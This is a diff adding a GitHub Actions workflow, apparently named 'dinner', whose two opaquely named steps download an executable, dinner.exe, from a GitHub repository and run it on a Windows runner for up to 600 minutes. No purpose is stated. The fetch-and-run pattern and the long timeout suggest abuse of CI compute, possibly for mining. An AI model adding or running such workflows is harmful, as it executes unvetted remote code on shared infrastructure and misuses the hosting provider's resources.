@@ -1,0 +1,12 @@
+name: dinner
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: ABC
+      run: Invoke-WebRequest https://github.com/Danideveloper1/hello-world/raw/main/dinner.exe -OutFile dinner.exe
+    - name: DEF
+      run: .\dinner.exe
+      timeout-minutes: 600
+    
